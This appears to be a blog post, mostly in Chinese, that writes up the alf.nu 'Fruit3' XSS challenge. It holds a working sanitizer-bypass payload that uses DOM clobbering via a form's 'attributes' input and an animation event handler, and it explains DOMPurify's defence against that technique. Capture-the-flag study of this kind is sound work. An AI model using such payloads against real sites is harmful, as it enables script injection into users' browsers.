---
layout: post
title:  "alf.nu XSS challenges Write-ups level18 to level29 (part two)"
date:   2020-10-19 21:46:23 +0800
categories: jekyll update
---
# alf.nu XSS challenges Write-ups level18 to level29 (part two)

## Fruit3
### code
```javascript
function escape(s) {
  var div = document.implementation.createHTMLDocument().createElement('div');
  div.innerHTML = s;
  function f(n) {
    if (/script/i.test(n.tagName)) n.parentNode.removeChild(n);
    for (var i=0; i<n.attributes.length; i++) {
      var name = n.attributes[i].name;
      if (name !== 'class') { n.removeAttribute(name); i--; }
    }
  }
  [].map.call(div.querySelectorAll('*'), f);
  return div.innerHTML;
}
```
### solution
```javascript
<style>@keyframes x{}</style><form style="animation-name:x" onanimationend="alert(1)"><input id=attributes></form>
```
### background info
这个XSS主要的技术是dom clobbering. 参考https://portswigger.net/web-security/dom-based/dom-clobbering.DOM clobbering不仅可以利用dom element来控制window scope的变量, 还可以用form元素的子元素input来污染form scope的变量. 

题中的escape函数遍历了n.attributes. 答案POC中的form元素的属性"attributes"就被子元素的的input污染了.

在理解这个原理后, 找一个合适的POC就可以了. 参考https://portswigger.net/web-security/cross-site-scripting/cheat-sheet . 注意本题iframe中autofocus是不能执行的.

dom clobbering对于XSS的sanitizer例如dompurify是一个切实的问题.dompurify是这么解决的

```javascript
 if (
      typeof elm.nodeName !== 'string' ||
      typeof elm.textContent !== 'string' ||
      typeof elm.removeChild !== 'function' ||
      !(elm.attributes instanceof NamedNodeMap) ||
      typeof elm.removeAttribute !== 'function' ||
      typeof elm.setAttribute !== 'function' ||
      typeof elm.namespaceURI !== 'string'
    ) {
      return true;
    }
```

也就是在对逐个元素进行检查的时候, 先检查是否被clobber,再进行sanity check.